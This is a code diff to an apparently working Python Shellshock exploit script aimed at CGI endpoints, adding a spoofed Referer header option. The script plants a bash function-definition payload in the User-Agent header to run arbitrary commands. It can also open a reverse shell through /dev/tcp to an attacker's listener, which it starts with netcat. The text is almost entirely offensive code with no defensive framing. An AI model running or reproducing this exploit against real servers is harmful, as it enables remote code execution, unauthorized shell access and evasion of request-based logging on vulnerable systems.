@@ -14,19 +14,21 @@ banner = '''
 #######################################
 '''
 
-def exploit(url, route_to_cgi, command, shell, lhost, lport, timeout):
+def exploit(url, route_to_cgi, command, shell, lhost, lport, timeout, referer_spoof):
     if shell:
         print("[+] Starting reverse shell to {}:{}".format(lhost, lport))
         subprocess.Popen(["rlwrap", "nc", "-nlvp", str(lport)], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         time.sleep(1)
         payload = "() { :; }; echo ; /bin/bash -i >& /dev/tcp/{}/{} 0>&1".format(lhost, lport)
         headers = {"User-Agent": payload}
-        cgi_url = url + route_to_cgi
-        response = requests.get(cgi_url, headers=headers, timeout=timeout)
     else:
         headers = {"User-Agent": "() { :; }; echo ; /bin/bash -c '{}'".format(command)}
-        cgi_url = url + route_to_cgi
-        response = requests.get(cgi_url, headers=headers, timeout=timeout)
+
+    if referer_spoof:
+        headers["Referer"] = referer_spoof
+
+    cgi_url = url + route_to_cgi
+    response = requests.get(cgi_url, headers=headers, timeout=timeout)
     if response.status_code == 200:
         print("[+] Exploit executed successfully:")
         print(response.text)
@@ -42,13 +44,14 @@ def main():
     parser.add_argument('-lh', '--lhost', help='Local host for reverse shell, for example: 10.10.14.6')
     parser.add_argument('-lp', '--lport', help='Local port for reverse shell, for example 443')
     parser.add_argument('-to', '--timeout', type=int, default=10, help='Timeout in seconds for HTTP requests, default is 10')
+    parser.add_argument('-R', '--referer-spoof', help='Referer spoofing header (trustable URL), \nf. ex: https://www.google.com/search?q=cabecera+referer&oq=cabecera+referer&aqs=chrome..69i57j69i59l2j0l4j69i60.3531j0j7&sourceid=chrome&ie=UTF-8')
     args = parser.parse_args()
 
     if args.shell and (not args.lhost or not args.lport):
         parser.error("Please specify a local host and port to spawn the reverse shell")
 
     print(banner)
-    exploit(args.url, args.route_to_cgi, args.command, args.shell, args.lhost, args.lport, args.timeout)
+    exploit(args.url, args.route_to_cgi, args.command, args.shell, args.lhost, args.lport, args.timeout, args.referer_spoof)
 
 if __name__ == '__main__':
     main()
